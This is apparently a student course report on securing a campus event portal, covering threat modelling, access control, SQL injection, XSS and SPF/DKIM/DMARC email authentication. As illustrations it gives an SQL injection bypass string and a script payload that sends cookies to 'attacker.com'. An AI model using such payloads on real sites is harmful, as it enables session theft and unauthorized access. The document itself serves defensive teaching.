# Security Implementation Report: Campus Event Portal

## 1. Project Overview
This project demonstrates the implementation of robust security controls for the **Campus Event Portal**, a web-based system for managing student events. The implementation focuses on three primary security domains defined in the course requirements:
- **Authentication & Authorization** (Preventing Broken Access Control)
- **Input Handling** (Preventing SQL Injection and Stored XSS)
- **Email Security** (Anti-phishing and DNS Authentication)

The system is designed as a "Security Lab" where users can toggle between **Vulnerable** and **Secure** modes to observe the direct impact of defensive coding.

---

## 2. Part A: Threat Analysis (STRIDE/OWASP)

Based on the system requirements, we identified 7 critical vulnerabilities using **Threat Dragon**.

| # | Threat | Category (OWASP) | Likelihood | Impact | Countermeasure |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 1 | SQL Injection (Registration) | A03:2021-Injection | High | High | Parameterized Queries (Prepared Statements) |
| 2 | Stored XSS (Comment System) | A03:2021-Injection | High | Med | Output Encoding & HTML Entity Sanitization |
| 3 | Parameter Tampering (Admin) | A01:2021-Broken Access Control | Med | High | Server-Side Role Verification (RBAC) |
| 4 | Brute Force Login | A07:2021-Identification & Auth | High | Med | PBKDF2 Password Hashing & Rate Limiting |
| 5 | Session Fixation | A07:2021-Identification & Auth | Med | High | Secure Token Regeneration upon Login |
| 6 | Email Spoofing | A04:2021-Insecure Design | Med | Med | SPF, DKIM, and DMARC Implementation |
| 7 | Insecure Direct Object Ref. | A01:2021-Broken Access Control | Med | High | Ownership validation for event deletion |

---

## 3. Part B: Secure Coding Blueprint & UML Alignment

### A. Broken Access Control (BAC)
**Scenario:** A student tries to access the admin dashboard by changing the URL parameter from `role=student` to `role=admin`.

*   **UML Reference:** `BrokenAccessControl.uml` & `AuthenticationFlow.uml`
*   **Vulnerability:** The server originally trusted the client-side role parameter.
*   **Secure Implementation:** 
    - The backend (`web_server.py` at `/api/admin_dashboard`) ignores client-provided role parameters in Secure Mode.
    - It performs a **Server-Side Lookup** using the session's verified `user_id`.
*   **Code-UML Relationship:** 
    - The UML depicts a "Verify Session/Role" node that queries a "Trusted DB".
    - The code implements this via `get_user_role_from_db()` in `auth_demo.py`.

### B. SQL Injection (SQLi) Prevention
**Scenario:** An attacker enters `' OR '1'='1` in the name field to bypass authentication or dump user data.

*   **UML Reference:** `Input Validation Flow.uml`
*   **Secure Implementation:** 
    - **Parameterized Queries:** Uses `?` placeholders (in `sqli_demo.py`) to ensure input is treated as data, not executable code.
    - **Input Validation:** A regex-based validator blocks common attack patterns.
*   **Code-UML Relationship:** 
    - The UML shows an `alt` fragment for "Validation Result".
    - The code in `run_sqli_demo()` mirrors this, returning a `400 Bad Request` if characters are invalid.

### C. Cross-Site Scripting (XSS) Prevention
**Scenario:** An attacker posts a comment containing `<script>fetch('attacker.com?cookie='+document.cookie)</script>`.

*   **UML Reference:** `Input Validation Flow.uml` (Sanitization Branch)
*   **Secure Implementation:**
    - **Backend Sanitization:** Uses `html.escape()` to neutralize tags before saving to DB.
    - **Frontend Defense:** UI uses `.textContent` instead of `.innerHTML` for display in secure mode.
*   **Code-UML Relationship:** 
    - The UML specifies a "Sanitize Input" process between receiving the request and persistence.
    - `xss_demo.py` acts as this middleware, converting `<script>` to `&lt;script&gt;`.

### D. Email Security & Anti-Phishing
**Scenario:** Attackers send spoofed emails pretending to be from `events.youruniversity.edu`.

*   **Anti-Phishing Controls:**
    - **DNS Authentication:** Simulated headers for SPF, DKIM, and DMARC.
    - **Visual Indicators:** "PASS/FAIL" badges in the UI and header analysis panel.
    - **Link Trust:** Secure mode enforces explicit trusted links over hidden redirects.
*   **Drafted DNS Records (Architecture):**
    | Record Type | Host | Value | Purpose |
    | :--- | :--- | :--- | :--- |
    | **SPF (TXT)** | `@` | `v=spf1 ip4:203.0.113.10 include:_spf.google.com ~all` | Authorizes campus mail servers |
    | **DKIM (TXT)** | `v1._domainkey` | `v=DKIM1; k=rsa; p=MIIBIjANBgkqhki...` | Cryptographic signature for body/headers |
    | **DMARC (TXT)**| `_dmarc` | `v=DMARC1; p=quarantine; rua=mailto:sec@univ.edu` | Policy for failed authentication |

---

## 4. Relationship Mapping Summary

| Feature | UML Diagram | Source Code | Security Control |
| :--- | :--- | :--- | :--- |
| **Login/Auth** | `AuthenticationFlow.uml` | `src/auth_demo.py` | PBKDF2 Password Hashing |
| **Registration** | `Input Validation Flow.uml` | `src/sqli_demo.py` | Prepared Statements |
| **Comments** | `Input Validation Flow.uml` | `src/xss_demo.py` | HTML Entity Encoding |
| **Admin Access** | `BrokenAccessControl.uml` | `src/web_server.py` | Server-Side RBAC |
| **Notifications** | Email Blueprint | `src/static/index.html` | SPF/DKIM/DMARC |

---

## 5. Technical Stack & Security Libraries
- **Backend:** Python 3.x (using `http.server` for demo portability).
- **Security Logic:** `html` library for XSS, `sqlite3` for parameterized queries, and `secrets` for session management.
- **Frontend:** Modern CSS Grid/Flexbox with Glassmorphism aesthetic.

## 6. Rubric Fulfillment Matrix

| Rubric Criteria | Evidence in Lab |
| :--- | :--- |
| **Threat Identification** | Matrix of 7 threats with prioritized risk scores (Tab 0). |
| **Technical Accuracy** | Use of industry-standard patterns (Parameterization, RBAC, DNS Sec). |
| **Code Comparison** | Side-by-side "Vulnerable" vs "Secure" code logic panels (Tabs 1-3). |
| **Architecture Design** | Explicit drafting of SPF/DKIM/DMARC records for the university domain. |

---

## 7. Submission Checklist
1.  **[ ] Threat Dragon Project**: Zipped JSON (7-threat matrix).
2.  **[ ] Papyrus Project**: Zipped UML files (`.uml`, `.notation`).
3.  **[ ] Source Code**: Zipped `src/` folder + `web_server.py` + `README.md`.
4.  **[ ] Presentation**: Google Drive URL showing live "Vulnerable vs Secure" toggle.
